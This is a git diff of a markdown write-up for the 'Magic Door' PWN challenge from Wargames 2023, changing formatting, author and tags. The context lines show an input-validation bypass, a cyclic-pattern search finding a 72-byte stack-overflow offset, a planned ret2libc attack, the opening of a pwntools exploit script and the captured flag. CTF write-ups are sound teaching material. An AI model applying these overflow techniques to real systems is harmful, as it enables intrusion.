@@ -1,10 +1,9 @@
 ---
 title: Magic Door
-author: broCapang
+author: capang
 date: 2024-01-01 09:30:00 +0800
 categories: [Writeups, PWN]
-tags: [Wargames 2023]
-pin: true
+tags: [wargames 2023]
 math: true
 mermaid: true
 ---
@@ -41,17 +40,14 @@ time to disassemble it in ghidra
 
 1st challenge 
 
-![[Pasted image 20231216170512.png]]
-
 We need to bypass input validation != "50015" but need string with integer value of 50015
 
 - Solution: +50015 or "050015"
 
 2nd Challenge
 
-![[Pasted image 20231216170620.png]]
-
 - magic_door function accepts insane amount of chars, time to try overflow it
+
 ```bash
 pwndbg> cyclic 100
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
@@ -121,6 +117,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 pwndbg>
 ```
 - we populate RSP with jaaaaaaakaaaaaaalaaaaaaamaaa
+
 ```
 jaaaaaaakaaaaaaalaaaaaaamaaa
 Found at offset 72
@@ -128,6 +125,7 @@ Found at offset 72
 - offset = 72
 - it needs 72 Characters for us to ovewrite the return address
 - next we can execute ret2libc attack
+
 ```python
 from pwn import *
 
@@ -222,6 +220,6 @@ wgmy{4a029bf40a28039c8492acfa866f8d96}
 '''
 
 ```
+{: file='exploit.py'}
 
-![[Pasted image 20231216171137.png]]
 wgmy{4a029bf40a28039c8492acfa866f8d96}
